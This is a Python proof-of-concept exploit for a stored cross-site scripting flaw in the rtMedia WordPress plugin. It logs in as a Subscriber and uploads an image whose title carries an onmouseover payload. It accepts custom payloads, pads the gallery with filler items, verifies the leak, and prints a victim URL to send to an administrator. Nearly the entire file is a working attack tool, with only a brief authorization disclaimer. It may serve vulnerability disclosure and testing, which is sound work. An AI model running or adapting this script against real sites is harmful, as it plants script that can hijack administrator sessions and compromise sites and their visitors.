#!/usr/bin/env python3
"""
Authenticated (Subscriber+) Stored XSS via media title
=========================================================================

The script:
  1. logs in with a low-privileged WordPress account (Subscriber by default),
  2. reads the generic rtMedia upload nonce from a gallery page,
  3. uploads a visible PNG whose "title" is an attribute-breakout XSS payload,
  4. uploads filler media so the poisoned item lands on gallery page 2,
  5. verifies the public JSON + Backbone template leak the raw title.

After it finishes, send the printed victim URL to a logged-in admin (or any
visitor). The victim clicks "Load More" and hovers the poisoned thumbnail.

Only Python 3 standard library is required.

Use this script only against WordPress sites you own or are explicitly authorized
to test.

Example:
    python3 poc.py --url http://target/wordpress/gallery/ \
        --username attacker --password 'AttackerPass123!'

If --username/--password are omitted, the script prompts for them.
If you already have a WordPress session, pass --cookie
"wordpress_logged_in_xxx=...; wordpress_sec_xxx=...".

If Chrome suppresses alert() dialogs, use a non-dialog proof:
    python3 poc.py --url http://target/wordpress/gallery/ \
        --username attacker --password 'AttackerPass123!' --proof background
"""

import argparse
import getpass
import http.cookiejar
import json
import re
import ssl
import struct
import sys
import uuid
import zlib
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlparse
from urllib.request import (
    HTTPCookieProcessor,
    HTTPSHandler,
    Request,
    build_opener,
)

PROOFS = {
    # Classic dialog proof.
    "alert": (
        'x" onmouseover="alert(document.domain)" '
        'style="display:block;width:300px;height:200px;background:#f00'
    ),
    # Visible proof that survives Chrome's dialog suppression.
    "background": (
        'x" onmouseover="document.body.style.background=\'red\'" '
        'style="display:block;width:300px;height:200px;background:#00f'
    ),
    # DOM proof that is visible in the tab title.
    "title": (
        'x" onmouseover="document.title=\'XSSED\'" '
        'style="display:block;width:300px;height:200px;background:#00f'
    ),
}
DEFAULT_PAYLOAD = PROOFS["alert"]


def make_png(width=300, height=200):
    """Build a visible solid-colour PNG using only the standard library.

    A visible thumbnail matters: the XSS fires when the victim hovers the
    gallery item, so a 1x1 image is a tiny and unreliable hover target in some
    browsers.
    """

    def chunk(kind, data):
        return (
            struct.pack(">I", len(data))
            + kind
            + data
            + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
        )

    row = b"\x00" + (b"\x33\x99\xff" * width)
    raw = row * height
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(raw, 9))
        + chunk(b"IEND", b"")
    )


PNG = make_png(300, 200)


def out(msg=""):
    print(msg, flush=True)


def fail(msg):
    out("[-] " + msg)
    sys.exit(1)


class HTTP:
    def __init__(self, timeout=30, insecure=False, cookie=None):
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        handlers = [HTTPCookieProcessor(self.jar)]
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(HTTPSHandler(context=ctx))
        self.opener = build_opener(*handlers)
        self.cookie = cookie

    def request(self, url, data=None, headers=None, method=None):
        hdrs = {"User-Agent": "rtmedia-xss-poc/1.0"}
        if headers:
            hdrs.update(headers)
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        req = Request(
            url,
            data=data,
            headers=hdrs,
            method=method or ("POST" if data is not None else "GET"),
        )
        return self.opener.open(req, timeout=self.timeout)

    def get(self, url, headers=None):
        return self.request(url, None, headers, "GET")

    def post(self, url, data, headers=None):
        return self.request(url, data, headers, "POST")


def read_text(resp):
    return resp.read().decode("utf-8", "replace")


def json_from_response(text):
    start = text.find("{")
    if start < 0:
        return None
    try:
        return json.loads(text[start:])
    except Exception:
        return None


def build_multipart(fields, filename, content_type, file_data):
    boundary = "----rtmediapoc" + uuid.uuid4().hex
    chunks = []
    for name, value in fields.items():
        chunks.append(
            (
                "--%s\r\n"
                'Content-Disposition: form-data; name="%s"\r\n\r\n'
                "%s\r\n" % (boundary, name, value)
            ).encode()
        )
    chunks.append(
        (
            "--%s\r\n"
            'Content-Disposition: form-data; name="rtmedia_file"; filename="%s"\r\n'
            "Content-Type: %s\r\n\r\n" % (boundary, filename, content_type)
        ).encode()
    )
    chunks.append(file_data)
    chunks.append(("\r\n--%s--\r\n" % boundary).encode())
    return b"".join(chunks), "multipart/form-data; boundary=" + boundary


def parse_hidden_fields(html):
    """Collect name/value pairs from the page's hidden inputs."""
    fields = {}
    for tag in re.findall(r"<input\b[^>]*>", html, re.I):
        name = re.search(r'name=["\']([^"\']+)', tag, re.I)
        value = re.search(r'value=["\']([^"\']*)', tag, re.I)
        if name and value:
            fields[name.group(1)] = value.group(1)
    return fields


def parse_hidden(html, name):
    patterns = [
        r'name=["\']%s["\'][^>]*value=["\']([^"\']*)' % re.escape(name),
        r'value=["\']([^"\']*)["\'][^>]*name=["\']%s["\']' % re.escape(name),
    ]
    for pat in patterns:
        m = re.search(pat, html, re.I)
        if m:
            return m.group(1)
    return None


def discover(html, page_url):
    """Find admin-ajax.php and the WordPress root from the rendered page."""
    m = re.search(r'"ajaxurl"\s*:\s*"([^"]+)"', html)
    if not m:
        m = re.search(r'"rtmedia_ajaxurl"\s*:\s*"([^"]+)"', html)
    if m:
        ajax = m.group(1).replace("\\/", "/")
        root = ajax.split("/wp-admin/")[0] + "/"
        return ajax, root
    p = urlparse(page_url)
    root = "%s://%s/" % (p.scheme, p.netloc)
    return root + "wp-admin/admin-ajax.php", root


def login(client, login_url, redirect_to, username, password):
    try:
        client.get(login_url)
    except (HTTPError, URLError):
        pass
    body = urlencode(
        {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": redirect_to,
            "testcookie": "1",
        }
    ).encode()
    resp = client.post(
        login_url, body, {"Content-Type": "application/x-www-form-urlencoded"}
    )
    html = read_text(resp)
    logged = any(c.name.startswith("wordpress_logged_in_") for c in client.jar)
    return logged, html


def upload(client, upload_url, referer, page_path, nonce, title):
    fields = {
        "action": "wp_handle_upload",
        "mode": "file_upload",
        "redirect": "no",
        "redirection": "false",
        "_wp_http_referer": page_path,
        "rtmedia_upload_nonce": nonce,
        "title": title,
        "description": "rtmedia stored xss poc",
    }
    body, ctype = build_multipart(fields, "poc.png", "image/png", PNG)
    resp = client.post(
        upload_url, body, {"Content-Type": ctype, "Referer": referer}
    )
    return read_text(resp)


def main():
    ap = argparse.ArgumentParser(
        description="rtMedia <= 4.7.17 Subscriber stored XSS PoC"
    )
    ap.add_argument(
        "--url",
        required=True,
        help="Gallery page URL containing [rtmedia_gallery] (and ideally [rtmedia_uploader]).",
    )
    ap.add_argument("--username", help="Low-privileged WordPress username (Subscriber).")
    ap.add_argument("--password", help="Password for --username.")
    ap.add_argument(
        "--cookie",
        help='Existing WordPress session cookie header, e.g. "wordpress_logged_in_...=...".',
    )
    ap.add_argument(
        "--proof",
        choices=sorted(PROOFS),
        default="alert",
        help="Built-in proof payload: alert (dialog), background (page turns red), "
        "title (tab title changes). Default: alert.",
    )
    ap.add_argument(
        "--payload",
        default=None,
        help="Custom title payload; overrides --proof.",
    )
    ap.add_argument(
        "--per-page",
        type=int,
        default=None,
        help="Override gallery items per page (otherwise read from the page).",
    )
    ap.add_argument(
        "--no-fill",
        action="store_true",
        help="Do not upload filler items (use when per_page=1 or page 2 already exists).",
    )
    ap.add_argument("--insecure", action="store_true", help="Ignore TLS certificate errors.")
    ap.add_argument("--login-url", help="Override wp-login.php URL.")
    args = ap.parse_args()
    if not args.payload:
        args.payload = PROOFS[args.proof]

    page_url = args.url
    parsed = urlparse(page_url)
    if not parsed.scheme or not parsed.netloc:
        fail("--url must be an absolute URL, e.g. http://target/wordpress/gallery/")
    page_path = parsed.path
    if not page_path.endswith("/"):
        page_path += "/"
    base = "%s://%s" % (parsed.scheme, parsed.netloc)
    upload_url = base + page_path + "upload/"

    client = HTTP(insecure=args.insecure, cookie=args.cookie)

    # 1. Discover WordPress root and login URL from the public page.
    try:
        guest_html = read_text(client.get(page_url))
    except HTTPError as exc:
        if exc.code == 404:
            fail(
                "Target page returned 404. Use the exact permalink of a published "
                "page that contains [rtmedia_gallery] and [rtmedia_uploader]."
            )
        fail("Could not fetch target page: %s" % exc)
    except Exception as exc:
        fail("Could not fetch target page: %s" % exc)

    ajax_url, wp_root = discover(guest_html, page_url)
    login_url = args.login_url or urljoin(wp_root, "wp-login.php")
    out("[+] Target page : %s" % page_url)
    out("[+] WordPress   : %s" % wp_root)
    out("[+] admin-ajax  : %s" % ajax_url)

    # 2. Authenticate unless a session cookie was supplied.
    if not args.cookie:
        username = args.username
        password = args.password
        if not username:
            username = input("[?] WordPress username (Subscriber): ").strip()
        if not password:
            password = getpass.getpass("[?] WordPress password: ")
        try:
            logged, _ = login(client, login_url, page_url, username, password)
        except Exception as exc:
            fail("Login request failed: %s" % exc)
        if not logged:
            fail(
                "Login failed. Check credentials, or use --cookie with an existing session."
            )
        out("[+] Logged in as: %s" % username)

    # 3. Fetch the gallery page as the attacker and read the generic nonce.
    try:
        html = read_text(client.get(page_url))
    except Exception as exc:
        fail("Could not fetch gallery page after login: %s" % exc)

    nonce = parse_hidden(html, "rtmedia_upload_nonce")
    if not nonce:
        fail(
            "Could not find rtmedia_upload_nonce. Is the uploader shortcode on this page "
            "and are uploads enabled for this user?"
        )
    per_page = args.per_page
    if per_page is None:
        per_page = parse_hidden(html, "per_page")
        try:
            per_page = int(per_page)
        except (TypeError, ValueError):
            per_page = 10
    per_page = max(1, min(per_page, 25))

    out("[+] Upload nonce: %s" % nonce)
    out("[+] per_page    : %d" % per_page)
    out("[+] Payload     : %s" % json.dumps(args.payload))

    # 4. Upload the poisoned media first, then push it to page 2 with fillers.
    try:
        raw = upload(
            client, upload_url, page_url, page_path, nonce, args.payload
        )
    except Exception as exc:
        fail("Upload failed: %s" % exc)

    data = json_from_response(raw)
    if not data or "media_id" not in data:
        fail("Unexpected upload response:\n%s" % raw[:1500])
    poisoned_id = data.get("media_id")
    out("[+] Poisoned media uploaded: id=%s permalink=%s" % (poisoned_id, data.get("permalink")))

    if not args.no_fill:
        out("[*] Uploading %d filler item(s) so the poisoned item is on page 2..." % per_page)
        for i in range(per_page):
            try:
                filler = upload(
                    client,
                    upload_url,
                    page_url,
                    page_path,
                    nonce,
                    "poc filler %d %s" % (i + 1, uuid.uuid4().hex[:6]),
                )
            except Exception as exc:
                fail("Filler upload failed: %s" % exc)
            fdata = json_from_response(filler)
            if not fdata or "media_id" not in fdata:
                fail("Unexpected filler response:\n%s" % filler[:1000])
        out("[+] Filler uploads done.")

    # 5. Verify the public JSON and the public Backbone template.
    # The gallery JS sends the page's hidden shortcode/context parameters to the
    # JSON endpoint. Reuse them so the same query/pagination is reproduced.
    hidden = parse_hidden_fields(html)
    excluded = {
        "_wp_http_referer",
        "mode",
        "rtmedia_upload_nonce",
        "rtmedia_media_nonce",
        "rtmedia_media_delete_nonce",
        "rtmedia_bulk_delete_nonce",
        "rtmedia_create_album_nonce",
        "rtmedia_allow_upload_attribute",
        "bulk-action",
    }
    verify_params = {k: v for k, v in hidden.items() if k not in excluded}
    verify_params["json"] = "true"
    verify_params["rtmedia_page"] = "2"
    json_url = base + page_path + "media/pg/2/?" + urlencode(verify_params)
    titles = []
    try:
        json_raw = read_text(client.get(json_url))
        j = json_from_response(json_raw)
        if j:
            titles = [row.get("media_title") for row in j.get("data", [])]
    except Exception as exc:
        out("[!] Could not verify JSON: %s" % exc)

    payload_present = any(t == args.payload for t in titles)
    out("[+] JSON page 2 titles: %s" % json.dumps(titles))
    out("[+] Payload in JSON   : %s" % ("YES" if payload_present else "NO"))

    tpl_url = ajax_url + ("&" if "?" in ajax_url else "?") + "action=rtmedia_get_template&template=media-gallery-item"
    template_ok = False
    try:
        tpl = read_text(
            client.post(
                tpl_url,
                b"backbone=true",
                {"Content-Type": "application/x-www-form-urlencoded"},
            )
        )
        template_ok = "<%= media_title %>" in tpl
        out("[+] Raw title in template: %s" % ("YES" if template_ok else "NO"))
    except Exception as exc:
        out("[!] Could not fetch template: %s" % exc)

    out("")
    out("=" * 72)
    out("VICTIM URL : %s" % page_url)
    out("Victim must: open the URL, click 'Load More', then hover the poisoned thumbnail.")
    out("=" * 72)

    if not (payload_present and template_ok):
        out("[!] Verification incomplete. The target may use a different gallery")
        out("    layout/order or the item may not be on page 2. Use --no-fill or")
        out("    --per-page to adjust.")


if __name__ == "__main__":
    main()
